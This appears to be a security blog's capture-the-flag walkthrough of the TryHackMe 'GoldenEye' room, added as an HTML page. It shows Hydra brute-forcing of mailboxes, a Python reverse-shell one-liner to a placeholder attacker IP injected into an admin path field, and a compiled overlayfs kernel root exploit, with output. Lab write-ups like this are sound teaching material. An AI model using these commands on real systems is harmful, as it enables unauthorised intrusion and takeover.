@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="en-us">
+
+  <head>
+  <link href="http://gmpg.org/xfn/11" rel="profile">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      GoldenEye &middot; Low Priv Notes
+    
+  </title>
+
+  
+  <link rel="canonical" href="http://localhost:4000/ctf/2026/07/04/goldeneye/">
+  
+
+  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
+  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">
+
+  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
+  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">
+
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">
+
+  
+</head>
+
+
+  <body>
+
+    <input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox">
+
+<div class="sidebar" id="sidebar">
+  <div class="sidebar-item">
+    <p>Notes, CTF writeups and security research. Focusing on alternative privilege escalation vectors.</p>
+  </div>
+
+  <nav class="sidebar-nav">
+    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>
+    <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
+  </nav>
+
+  <div class="sidebar-item">
+    <p>
+      &copy; 2026. All rights reserved.
+    </p>
+  </div>
+</div>
+
+
+    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
+         content to avoid any CSS collisions with our real content. -->
+    <div class="wrap">
+      <div class="masthead">
+        <div class="container">
+          <h3 class="masthead-title">
+            <a href="/" title="Home">Low Priv Notes</a>
+<br>            
+<small>Exploring alternative exploitation paths</small>
+          </h3>
+        </div>
+      </div>
+
+      <div class="container content">
+        <div class="post">
+  <h1 class="post-title">GoldenEye</h1>
+  <span class="post-date">04 Jul 2026</span>
+  <h2 id="overview">Overview</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th> </th>
+      <th> </th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Platform</strong></td>
+      <td>TryHackMe</td>
+    </tr>
+    <tr>
+      <td><strong>Difficulty</strong></td>
+      <td>Medium</td>
+    </tr>
+    <tr>
+      <td><strong>URL</strong></td>
+      <td><a href="https://tryhackme.com/room/goldeneye" target="_blank">https://tryhackme.com/room/goldeneye</a></td>
+    </tr>
+    <tr>
+      <td><strong>Focus</strong></td>
+      <td>Credential harvesting through internal email, ending in an admin panel field that never expected to be treated as a command</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>GoldenEye is a Bond-themed box that starts with a very ordinary-looking mail server and a website. Getting a foothold means treating the mailboxes as the actual attack surface instead of the web app in front of them — and the final way in isn’t a known CVE, it’s a configuration field nobody thought to validate.</p>
+
+<hr />
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>I start with a full port scan:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-p-</span> &lt;TARGET_IP&gt; <span class="nt">-oN</span> nmap.txt
+
+PORT      STATE SERVICE  VERSION
+25/tcp    open  smtp     Postfix smtpd
+80/tcp    open  http     Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
+55006/tcp open  ssl/pop3 Dovecot pop3d
+55007/tcp open  pop3     Dovecot pop3d
+</code></pre></div></div>
+
+<p>SMTP, a web server, and POP3 on two non-standard ports (one over SSL). There’s no SSH exposed, which already tells me the intended path is through mail, not a shell service.</p>
+
+<h2 id="getting-in">Getting In</h2>
+
+<p>The website is a themed login page, but the real lead is in the client-side JavaScript:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-s</span> http://&lt;TARGET_IP&gt;/terminal.js | <span class="nb">grep</span> <span class="nt">-A</span> 5 <span class="s2">"password"</span>
+
+//Boris, make sure you update your default password. 
+//My sources say MI6 maybe planning to infiltrate. 
+//I encoded you p@ssword below...
+//
+//&amp;#73<span class="p">;</span>&amp;#110<span class="p">;</span>&amp;#118<span class="p">;</span>&amp;#105<span class="p">;</span>&amp;#110<span class="p">;</span>&amp;#99<span class="p">;</span>&amp;#105<span class="p">;</span>&amp;#98<span class="p">;</span>&amp;#108<span class="p">;</span>&amp;#101<span class="p">;</span>&amp;#72<span class="p">;</span>&amp;#97<span class="p">;</span>&amp;#99<span class="p">;</span>&amp;#107<span class="p">;</span>&amp;#51<span class="p">;</span>&amp;#114<span class="p">;</span>
+</code></pre></div></div>
+
+<p>That’s HTML entity-encoded — decoding it gives me a plaintext password for a user called <code class="language-plaintext highlighter-rouge">boris</code>: <code class="language-plaintext highlighter-rouge">InvincibleHack3r</code>. I don’t have anywhere to use it yet, but I do have SMTP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;TARGET_IP&gt; 25
+
+220 ubuntu GoldentEye SMTP Electronic-Mail agent
+
+VRFY boris
+252 2.0.0 boris
+
+VRFY natalya
+252 2.0.0 natalya
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">VRFY</code> confirms both <code class="language-plaintext highlighter-rouge">boris</code> and <code class="language-plaintext highlighter-rouge">natalya</code> are valid mailbox users. With boris’s leaked password already in hand, I go straight for POP3.</p>
+
+<h2 id="email-harvesting-a-credential-cascade">Email Harvesting: A Credential Cascade</h2>
+
+<p>This is where the room’s real structure shows up — POP3 access to one mailbox leaks the password for the next.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> boris <span class="nt">-P</span> /usr/share/wordlists/fasttrack.txt pop3://&lt;TARGET_IP&gt;:55007
+
+<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt;   login: boris   password: secret1!
+</code></pre></div></div>
+
+<p>Boris’s inbox is mostly noise, but one email mentions “Alec” and final codes stored somewhere on root — a hint I file away for later, not something to act on yet. What matters right now is that <code class="language-plaintext highlighter-rouge">natalya</code> also needs brute-forcing, since I don’t have her password from anywhere else:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hydra <span class="nt">-l</span> natalya <span class="nt">-P</span> /usr/share/wordlists/fasttrack.txt pop3://&lt;TARGET_IP&gt;:55007
+
+<span class="o">[</span>55007][pop3] host: &lt;TARGET_IP&gt;   login: natalya   password: bird
+</code></pre></div></div>
+
+<p>Natalya’s inbox has an email from root assigning a brand-new account:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username: xenia
+password: RCP90rulez!
+
+Internal domain: severnaya-station.com/gnocertdir
+</code></pre></div></div>
+
+<p>That’s an internal hostname I haven’t seen anywhere in the scan — I add it to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> and hit it directly with xenia’s credentials:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-u</span> xenia:RCP90rulez! http://severnaya-station.com/gnocertdir/
+</code></pre></div></div>
+
+<p>Access granted to an internal portal. Browsing the user profiles here surfaces another username, <code class="language-plaintext highlighter-rouge">doak</code> — so the cascade continues. One more round of Hydra against POP3 (same command, different username) gets his mailbox open, and his email hands off credentials for yet another account, <code class="language-plaintext highlighter-rouge">dr_doak</code>.</p>
+
+<p>Logging into the portal as <code class="language-plaintext highlighter-rouge">dr_doak</code> turns up a file, <code class="language-plaintext highlighter-rouge">s3cret.txt</code>, which points at an image: <code class="language-plaintext highlighter-rouge">/dir007key/for-007.jpg</code>.</p>
+
+<p>Pulling the metadata off that image is the last hop in the chain:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftool /dir007key/for-007.jpg | <span class="nb">grep</span> <span class="nt">-i</span> description
+
+Image Description: <span class="nv">eFdpbnRlcjE5OTV4IQ</span><span class="o">==</span>
+
+<span class="nb">echo</span> <span class="s2">"eFdpbnRlcjE5OTV4IQ=="</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+
+xWinter1995x!
+</code></pre></div></div>
+
+<p>That decodes to the admin password. Four mailboxes, four hand-offs, and I’ve gone from an unauthenticated visitor to admin — without touching a single known exploit.</p>
+
+<h2 id="getting-admin-the-aspell-injection">Getting Admin: The Aspell Injection</h2>
+
+<p>The admin panel is a spell-check configuration screen, and this is the part of the room I actually enjoyed. There’s a setting to pick the spell-check engine:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-u</span> admin:xWinter1995x! <span class="s2">"http://severnaya-station.com/gnocertdir/admin/settings.php?section=spellengine"</span>
+</code></pre></div></div>
+
+<p>It’s currently set to “Google Spell”. Switching it to “PSpellShell” changes how the backend invokes the spell-checker — instead of an API call, it shells out to a local binary. And right next to that setting is another field:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-u</span> admin:xWinter1995x! <span class="s2">"http://severnaya-station.com/gnocertdir/admin/settings.php?section=systempaths"</span>
+</code></pre></div></div>
+
+<p>“Path to aspell” — empty, and free text. Nothing here validates that this is actually a path to a binary. So I put a reverse shell one-liner in it instead:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("&lt;ATTACKER_IP&gt;",&lt;ATTACKER_PORT&gt;));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+</code></pre></div></div>
+
+<p>It won’t run until the spell-checker is actually triggered, so I create a new post in the portal, write some throwaway text, and click “Activate spelling” with a listener up:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;ATTACKER_PORT&gt;
+
+listening on <span class="o">[</span>any] &lt;ATTACKER_PORT&gt; ...
+connect to <span class="o">[</span>&lt;ATTACKER_IP&gt;] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>&lt;TARGET_IP&gt;] 39983
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Shell as <code class="language-plaintext highlighter-rouge">www-data</code>. The interesting part isn’t the payload — it’s that a config field meant to hold a filesystem path was trusted enough to get executed with zero validation.</p>
+
+<h2 id="breaking-out-with-overlayfs">Breaking Out With overlayfs</h2>
+
+<p><code class="language-plaintext highlighter-rouge">www-data</code> isn’t the goal, so I check what I’m working with:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">uname</span> <span class="nt">-a</span>
+
+Linux ubuntu 3.13.0-32-generic <span class="c">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>
+</code></pre></div></div>
+
+<p>Kernel 3.13.0 is vulnerable to the overlayfs privilege escalation (CVE-2015-1328). I grab the public exploit and try to compile it the normal way, and immediately hit a wall — there’s no <code class="language-plaintext highlighter-rouge">gcc</code> on this box. There is a <code class="language-plaintext highlighter-rouge">clang</code>, though, and the exploit’s source only calls <code class="language-plaintext highlighter-rouge">gcc</code> by name, not by any actual gcc-specific feature:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /tmp
+
+clang <span class="nt">--version</span>
+
+Ubuntu clang version 3.4-1ubuntu3 <span class="o">(</span>based on LLVM 3.4<span class="o">)</span>
+
+<span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/gcc/clang/g'</span> 37292.c
+
+clang 37292.c <span class="nt">-o</span> exploit
+
+37292.c:97:1: warning: control may reach end of non-void <span class="k">function</span> <span class="o">[</span><span class="nt">-Wreturn-type</span><span class="o">]</span>
+1 warning generated.
+</code></pre></div></div>
+
+<p>One warning, no errors. Running it:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./exploit
+
+spawning threads
+mount <span class="c">#1</span>
+mount <span class="c">#2</span>
+child threads <span class="k">done</span>
+/etc/ld.so.preload created
+creating shared library
+<span class="c"># id</span>
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Root.</p>
+
+<hr />
+
+<h2 id="attack-flow">Attack Flow</h2>
+
+<div class="mermaid">
+graph TD
+    A["Nmap scan<br />SMTP, HTTP, POP3 exposed"] --&gt; B["terminal.js<br />HTML-entity encoded password"]
+    B --&gt; C["SMTP VRFY<br />confirms boris, natalya"]
+    C --&gt; D["Hydra POP3 brute-force<br />boris mailbox"]
+    D --&gt; E["Hydra POP3 brute-force<br />natalya mailbox"]
+    E --&gt; F["Email leak<br />xenia credentials + internal domain"]
+    F --&gt; G["Internal portal access<br />doak found, mailbox cracked"]
+    G --&gt; H["Email leak<br />dr_doak credentials"]
+    H --&gt; I["Portal file s3cret.txt<br />points to JPEG"]
+    I --&gt; J["EXIF + base64 decode<br />admin password"]
+    J --&gt; K["Admin panel<br />PSpellShell engine switch"]
+    K --&gt; L["Unvalidated path field<br />command injection"]
+    L --&gt; M["Reverse shell<br />www-data"]
+    M --&gt; N["overlayfs exploit<br />clang instead of gcc"]
+    N --&gt; O["Root shell"]
+</div>
+
+<hr />
+
+<h2 id="key-takeaways">Key Takeaways</h2>
+
+<p><strong>A “path” field is still an injection vector</strong> — Any input that ends up being executed by the backend is dangerous, even if the UI frames it as a filesystem path rather than a command.</p>
+
+<p><strong>Missing compiler doesn’t mean blocked exploit</strong> — If exploit source only references a compiler by name and not by compiler-specific behavior, swapping the name is often enough to get it running on whatever’s available.</p>
+
+<p><strong>Internal email is a lateral movement channel, not just information</strong> — Each mailbox in this room existed purely to hand off the next credential, which is a realistic pattern in orgs with weak internal mail hygiene.</p>
+
+</div>
+
+
+<div class="related">
+  <h2>Related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/ctf/web/2026/07/10/blog/">
+            Blog
+            <small>10 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/ctf/2026/07/08/watcher/">
+            Watcher
+            <small>08 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/websec/2026/07/07/username-enumeration-timing/">
+            Username Enumeration via Response Timing
+            <small>07 Jul 2026</small>
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+      </div>
+    </div>
+
+    <label for="sidebar-checkbox" class="sidebar-toggle"></label>
+
+    <script src='/public/js/script.js'></script>
+  </body>
+</html>
